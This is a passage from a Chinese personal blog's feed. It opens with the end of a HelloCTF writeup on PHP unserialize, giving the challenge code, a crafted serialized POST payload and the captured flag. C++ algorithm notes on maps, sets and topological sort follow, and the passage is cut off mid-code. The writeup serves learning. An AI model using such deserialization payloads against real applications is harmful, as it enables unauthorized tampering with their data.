variable">$your_string</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$your_number</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$your_boolean</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$your_NULL</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>    <span class="token variable">$your_boolean</span> <span class="token operator">&amp;&amp;</span>     <span class="token variable">$your_NULL</span> <span class="token operator">==</span> <span class="token constant">null</span> <span class="token operator">&amp;&amp;</span>    <span class="token variable">$your_string</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"IWANT"</span> <span class="token operator">&amp;&amp;</span>    <span class="token variable">$your_number</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span>    <span class="token variable">$your_object</span><span class="token operator">-></span><span class="token property">a_value</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"FLAG"</span> <span class="token operator">&amp;&amp;</span>    <span class="token variable">$your_array</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"Plz"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$your_array</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"Give_M3"</span>  <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span><span class="token punctuation">&#123;</span>      <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You really know how to serialize?"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>答案都已经在明面上了～我们 POST 一个序列化，令其反序列化的数据等于题目所需即可。</p><p>构造 POST payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">o<span class="token operator">=</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a_class"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a_value"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"FLAG"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Plz"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"b"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Give_M3"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>s<span class="token operator">=</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"IWANT"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>i<span class="token operator">=</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>b<span class="token operator">=</span>b<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>n<span class="token operator">=</span><span class="token constant">N</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">HelloCTF&#123;Gre4t,y0u_can_als0_ser4l1ze2se_1n_y0ur_m1nd!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><p>未完待续……</p>]]></content>
    
    
    <summary type="html">讨厌 PHP</summary>
    
    
    
    <category term="日常学习" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF学习" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/CTF%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="https://notes.moyuin.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://notes.moyuin.top/tags/CTF/"/>
    
    <category term="writeup" scheme="https://notes.moyuin.top/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>一些算法笔记</title>
    <link href="https://notes.moyuin.top/2025/07/01/xue-xi/suan-fa/yi-xie-suan-fa-bi-ji/"/>
    <id>https://notes.moyuin.top/2025/07/01/xue-xi/suan-fa/yi-xie-suan-fa-bi-ji/</id>
    <published>2025-07-01T01:57:52.000Z</published>
    <updated>2025-07-01T01:57:52.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>一些算法笔记</h1><p>记录一些做题中不太知道的，免得丢掉印象。</p><h2 id="Enum-class">Enum class</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">enum</span> <span class="token keyword">class</span> <span class="token class-name">Gesture</span><span class="token punctuation">&#123;</span>    C<span class="token punctuation">,</span> <span class="token comment">// 石头</span>    J<span class="token punctuation">,</span> <span class="token comment">// 剪刀</span>    B  <span class="token comment">// 布</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于 <code>enum class</code> 结构，调用的时候得用 <code>Gesture::C</code> 这种格式。</p><h2 id="Map-low-bound">Map - low_bound</h2><p>在 <code>map</code> 里面有一个很好用的 <code>low_bound</code> 函数，在map中查找第一个<strong>不小于</strong>（也就是大于或等于）给定的 <code>key</code> 的元素。<br>根据这个函数，可以实现一个区间的映射建立</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">std<span class="token double-colon punctuation">::</span>map<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">></span> gradeMap <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">&#123;</span><span class="token number">59</span><span class="token punctuation">,</span> <span class="token char">'F'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token comment">// 0-59分 -> F</span> <span class="token punctuation">&#123;</span><span class="token number">69</span><span class="token punctuation">,</span> <span class="token char">'D'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token comment">// 60-69分 -> D </span> <span class="token punctuation">&#123;</span><span class="token number">79</span><span class="token punctuation">,</span> <span class="token char">'C'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token comment">// 70-79分 -> C </span> <span class="token punctuation">&#123;</span><span class="token number">89</span><span class="token punctuation">,</span> <span class="token char">'B'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token comment">// 80-89分 -> B </span> <span class="token punctuation">&#123;</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token char">'A'</span><span class="token punctuation">&#125;</span> <span class="token comment">// 90-100分 -> A</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token function">getGradeFromMap</span><span class="token punctuation">(</span><span class="token keyword">int</span> score<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 如果分数小于0或者大于100，直接返回无效</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>score <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> score <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token char">'?'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 查找第一个不小于score的键值对</span>    <span class="token keyword">auto</span> it <span class="token operator">=</span> gradeMap<span class="token punctuation">.</span><span class="token function">lower_bound</span><span class="token punctuation">(</span>score<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// lower_bound 找到了一个合法的区间上限</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>it <span class="token operator">!=</span> gradeMap<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// it->first 是上限分数，it->second 是对应的等级</span>        <span class="token keyword">return</span> it<span class="token operator">-></span>second<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 如果没找到（比如分数大于100，虽然我们已经处理了），则为无效</span>    <span class="token keyword">return</span> <span class="token char">'?'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Set">Set</h2><p><code>set</code> 调用的时候得用 <code>auto</code>，迭代器。<br>用 <code>insert</code> 插入值，迭代器输出值，迭代器是指针，所以得 <code>*it</code> 用来解应用。<br>见 <a href="https://cg.hnu.edu.cn/assignment/programList.jsp?proNum=12&amp;courseID=99&amp;assignID=1362&amp;libCenter=false">week 2 12拼写检查</a>。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">set<span class="token operator">&lt;</span>ll<span class="token operator">></span>s<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>ll i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        ll x<span class="token punctuation">;</span>        cin<span class="token operator">>></span>x<span class="token punctuation">;</span>        s<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    ll count<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">auto</span> it<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>it<span class="token operator">!=</span>s<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span>count<span class="token operator">&lt;</span>k<span class="token punctuation">;</span>it<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        count<span class="token operator">++</span><span class="token punctuation">;</span>        cout<span class="token operator">&lt;&lt;</span><span class="token operator">*</span>it<span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="并行">并行</h2><p>先把“并行”的本质想清楚：<strong>一个任务最早能开工的时间 = 它所有前置任务的“完成时间”的最大值</strong>。</p><p>所以你不需要显式“合并时间”，只要维护“最早开始/完成时间”，并在拓扑序里用 max 推进，<strong>并行的效果自然出现</strong>。<br>见 <a href="https://www.luogu.com.cn/problem/P1113">luogu P1113</a></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;vector></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token comment">//依次读入每个杂务的工作说明。计算出所有杂务都被完成的最短时间。</span><span class="token comment">// 互相没有关系的杂务可以同时工作</span><span class="token comment">// 有些杂务必须在另一些杂务完成的情况下才能进行。</span><span class="token comment">// 有需要完成的 n 个杂务的清单，并且这份清单是有一定顺序的，杂务 k (k>1) 的准备工作只可能在杂务 1 至 k−1 中。</span><span class="token comment">// 一道拓扑排序题，找到所有入度为0的点，更新其邻接点的入度，直到所有点都被更新完，但是并行计算时间是一个难点……</span><span class="token comment">// 有些任务不需要第二个任务完成，但是下一个任务需要第二个和第三个共同完成，且第二个任务完成时间比第三个短的话，特殊任务不能计入计算……</span><span class="token comment">// 难点是找到并行时间最大值。</span>  <span class="token keyword">struct</span> <span class="token class-name">task</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> id<span class="token punctuation">;</span><span class="token keyword">int</span> time<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span>next<span class="token punctuation">;</span><span class="token keyword">int</span> inDegree<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> n<span class="token punctuation">;</span>cin<span class="token operator">>></span>n<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>task<span class="token operator">></span><span class="token function">tasks</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> id<span class="token punctuation">,</span>t<span class="token punctuation">;</span>cin<span class="token operator">>></span>id<span class="token operator">>></span>t<span class="token punctuation">;</span>tasks<span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">.</span>id<span class="token operator">=</span>id<span class="token punctuation">;</span>tasks<span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">.</span>time<span class="token operator">=</span>t<span class="token punctuation">;</span><span class="token keyword">int</span> k<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>cin<span class="token operator">>></span>k<span class="token punctuation">,</span>k<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>tasks<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>tasks<span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">.</span>inDegree<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token function">start</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 每个任务的最早开工时间，我该做线性统计而非归并计算……</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token function">end</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 完成每个任务的最早时间</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>tasks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>inDegree<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>end<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>start<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>tasks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>time<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> v<span class="token operator">:</span>tasks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>next<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>start<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>start<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">,</span>end<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>tasks<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span>inDegree<span class="token operator">--</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//当入度为0，可以和现有线性时间的标记终止时间做比较了……</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//最后终止的时间就是最短时间。把时间当作线性看待是关键。</span>cout<span class="token operator">&lt;&lt;</span><span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>end<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Kahn-拓扑排序">Kahn 拓扑排序</h2><h3 id="🟢-模板-1：固定源点-已知-u-v"><strong>🟢 模板 1：固定源点 + 已知</strong> <strong>u &lt; v</strong></h3><blockquote><p>（比如洛谷 <a href="https://www.luogu.com.cn/problem/P1807"> P1807</a>，保证输入边满足 u &lt; v）</p></blockquote><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">const</span> <span class="token keyword">long</span> <span class="token keyword">long</span> NEG <span class="token operator">=</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token number">1LL</span> <span class="token operator">&lt;&lt;</span> <span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">></span> <span class="token function">dist</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> NEG<span class="token punctuation">)</span><span class="token punctuation">;</span>dist<span class="token punctuation">[</span>src<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> u <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> u <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>u<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>dist<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">==</span> NEG<span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span> <span class="token comment">// 不可达跳过</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token punctuation">[</span>v<span class="token punctuation">,</span> w<span class="token punctuation">]</span> <span class="token operator">:</span> adj<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        dist<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dist<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">,</span> dist<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">+</span> w<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>适用</strong>：题面保证 u &lt; v，编号就是拓扑序。</li><li><strong>结果</strong>：<code>dist[v]</code> 是从源点出发到 v 的最长路。</li></ul><hr><h3 id="🟡-模板-2：固定源点-不保证-u-v"><strong>🟡 模板 2：固定源点 + 不保证</strong> <strong>u &lt; v</strong></h3><blockquote><p>需要自己跑 Kahn 拓扑</p></blockquote><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">const</span> <span class="token keyword">long</span> <span class="token keyword">long</span> NEG <span class="token operator">=</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token number">1LL</span> <span class="token operator">&lt;&lt;</span> <span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">></span> <span class="token function">dist</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> NEG<span class="token punctuation">)</span><span class="token punctuation">;</span>dist<span class="token punctuation">[</span>src<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> q<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">indeg</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 读边时统计 indeg[v]++</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>indeg<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> u <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>dist<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">!=</span> NEG<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 源点可达才转移</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token punctuation">[</span>v<span class="token punctuation">,</span> w<span class="token punctuation">]</span> <span class="token operator">:</span> adj<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            dist<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dist<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">,</span> dist<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">+</span> w<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">--</span>indeg<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token punctuation">[</span>v<span class="token punctuation">,</span> w<span class="token punctuation">]</span> <span class="token operator">:</span> adj<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">--</span>indeg<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>适用</strong>：无 u &lt; v 保证，但题目给的是 DAG。</li><li><strong>结果</strong>：<code>dist[v]</code> 是从指定源点到 v 的最长路。</li></ul><hr><h3 id="🔴-模板-3：全图最长路径（任意源-→-任意点）"><strong>🔴 模板 3：全图最长路径（任意源 → 任意点）</strong></h3><blockquote><p>先找所有入度 0 的点作为源</p></blockquote><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">const</span> <span class="token keyword">long</span> <span class="token keyword">long</span> NEG <span class="token operator">=</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token number">1LL</span> <span class="token operator">&lt;&lt;</span> <span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">></span> <span class="token function">dist</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> NEG<span class="token punctuation">)</span><span class="token punctuation">;</span>queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> q<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">indeg</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 读边时统计 indeg[v]++</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span 